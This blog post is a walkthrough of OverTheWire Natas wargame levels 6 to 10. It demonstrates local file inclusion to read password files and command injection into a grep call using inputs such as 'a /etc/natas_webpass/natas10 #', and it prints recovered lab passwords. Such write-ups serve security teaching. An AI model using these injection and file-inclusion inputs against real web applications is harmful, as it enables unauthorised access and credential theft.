---
layout: post
title: "OverTheWire: Natas 6-10"
date: 2016-10-30 12:00:00
share: true
comments: true
tags: [OverTheWire - Natas]
---

_Many challenges from now on will show you the source code behind it.Some of these implementations are quite similar to what is actually used in production, so it's both valuable to know how they work as well as how you can exploit them._


## Natas 6

In this level you need to submit a secret password, going through the source code you'll realize it's stored in [includes/secret.inc]( http://natas6.natas.labs.overthewire.org/includes/secret.inc).
But why is it shown as blank? Check the source code, you'll realize it's stored in PHP tags.

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Submitting the secret keyword in the form will reveal our next password.

![7]({{ site.baseurl}}/images/7.png)

___________________________________________

## Natas 7

2 pages beside the index page exist, `Home` and `About`. They don't seem
to be particularly useful but the way the url is constructed [definitely
is](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion). You'll
also notice a hint in both pages in the source code:

```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

You may have realized already that this is a `local file inclusion` vulnerability, if not check the OWASP link previously mentioned. LFI is one of many web application vulnerabilities where the parameters are not properly sanitized. The url is in the following format:
```
http://natas7.natas.labs.overthewire.org/index.php?page=filename
```

Code behind it possibly looks like this:

```php
<?php
$file = $_GET['page'];

if(isset($file))
{
    include($file);
}
else
{
    include("index.php");
}
?>
```

A simple request with the full path of the password file will do.

Hitting `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`
will reveal the password.

___________________________________________

## Natas 8

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

```

In this challenge we need to submit a secret pass which should match the string `$encodedSecret`. One approach is to brute force the solution till it works (BAD!), the more obvious one is reversing whatever the `encodedSecret` method does.

Fire up a terminal with PHP installed, let's write the code for the reverse
function:

```console
root@kali:~# php -r '$passKey=base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));echo $passKey;'
oubWYf2kBqr
```

Submitting "oubWYf2kBqr" in the form will reveal the password.

![8]({{ site.baseurl}}/images/8.png)

___________________________________________

## Natas 9

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

[`passthru`](http://php.net/manual/en/function.passthru.php) is one of the PHP functions that allows executing commands along with [`exec`](http://php.net/manual/en/function.exec.php) and [`system`](http://php.net/manual/en/function.system.php). Try entering any
character and you'll notice it's just grepping it from a dictionary.txt file.

As we know from earlier, passwords are in `/etc/natas_webpass/natasX`, where X is the level number. So we want it to run grep against `/etc/natas_webpass/natas10`. How do we make this command behave the way we want it to? By code injection.

Using the pound symbol # allows us to terminate a bash command, example below:

```console
root@kali:~/Documents# ls
emptyfile
root@kali:~/Documents# whoami
root
root@kali:~/Documents# ls # whoami
emptyfile
root@kali:~/Documents# whoami # ls
root
```

By sending a random character (hoping it's in the password) followed by the file we want to read and a pound key will do.

Input: `a /etc/natas_webpass/natas10 #`

___________________________________________

## Natas 10

This challenge is quite similar to Natas 9, except that we can't use many
special characters.

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Fortunately, our same exact approach works in this example too.

1. **Input**: `a /etc/natas_webpass/natas11 #`
**Output**: _empty_

2. **Input**: `b /etc/natas_webpass/natas11 #`
**Output**: _empty_

3. **Input**: `c /etc/natas_webpass/natas11 #`
**Output**: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

Sweet, the password is `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`.